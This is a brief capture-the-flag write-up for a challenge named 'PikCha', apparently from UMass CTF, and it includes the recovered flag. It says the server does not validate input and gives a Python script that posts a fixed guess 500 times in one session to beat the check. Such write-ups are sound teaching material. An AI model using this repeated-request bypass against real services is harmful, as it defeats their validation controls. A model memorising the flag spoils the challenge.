# PikCha

>http://104.197.195.221:8084 >http://34.121.84.161:8084
>
>Created by Soul#8230

The server doesn't valid the input.
## python script
```python3
#!/usr/bin/env python3

import requests

URL = "http://104.197.195.221:8084/"


payload = {'guess':'a a a a'}
session = requests.Session()
session.get(url = URL)

i=0
while i != 500:
    r = session.post(url = URL, data = payload)
    i=i+1
    print(r.text)

```



`UMASS{G0tt4_c4tch_th3m_4ll_17263548}`
